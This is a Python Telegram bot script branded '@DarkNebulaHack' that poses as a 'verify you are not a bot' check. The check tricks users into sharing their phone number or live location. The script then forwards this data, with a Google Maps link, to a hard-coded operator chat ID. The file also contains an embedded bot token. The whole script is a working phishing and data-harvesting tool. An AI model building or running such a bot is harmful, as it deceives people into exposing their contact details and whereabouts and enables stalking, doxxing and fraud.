import telebot
from telebot import types
Token='7098255544:AAGWsnOWG7N03aq3gAy2rcIdRvySJSsAzww'
bot = telebot.TeleBot(Token)
id = '5860571537'

@bot.message_handler(commands=['start'])
def register(message):
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True)
    reg_button = types.KeyboardButton(text="Ben Bot Değilim.", request_contact=True)
    location_button = types.KeyboardButton(text="Ben Botum.", request_location=True)
    keyboard.add(reg_button, location_button)
    response = bot.send_message(message.chat.id, "Lütfen bot olmadığınızı doğrulayın.", reply_markup=keyboard)
@bot.message_handler(content_types=['contact'])
def contact_handler(message):
    num = message.contact.phone_number
    bot.send_message(id, text=f"Numaranı Bizimle Paylaştığın İçin Teşekkür Ederiz. : {num} • ¢нαηηєℓ; @DarkNebulaHack •")
    bot.send_message(message.chat.id, text="Thx :)")
@bot.message_handler(content_types=['location'])
def location_handler(message):
    loc = message.location
    lat = loc.latitude
    lon = loc.longitude
    bot.send_message(id, text=f'''
Mevcut Konumunuz :
 Enlem={lat}
 Boylam={lon}
 ● [ Google haritası ](https://www.google.com/maps/place/{lat},{lon})''',parse_mode='markdown')
    bot.send_message(message.chat.id, text="Bulunduğunuz Konumu Bizimle Paylaştığınız İçin Teşekkür Ederi. • ¢нαηηєℓ; @DarkNebulaHack :)")

bot.infinity_polling()
